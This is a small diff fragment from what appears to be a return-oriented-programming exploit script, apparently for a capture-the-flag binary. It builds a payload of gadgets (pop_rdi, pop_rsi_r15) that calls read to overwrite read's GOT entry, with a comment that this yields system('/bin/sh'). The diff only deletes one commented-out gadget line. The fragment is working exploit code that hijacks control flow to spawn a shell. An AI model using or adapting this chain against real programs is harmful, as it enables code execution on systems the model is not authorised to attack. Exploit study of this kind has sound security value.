@@ -44,7 +44,6 @@ payload += p64(puts_plt)
 ## read(0, read_got, 0x10)
 payload += p64(pop_rdi) + p64(0)
 payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
-# payload += p64(0x0000000000001b96) + p64(0x10)
 payload += p64(read_plt)
 
 ## read('/bin/sh') == system('/bin/sh')
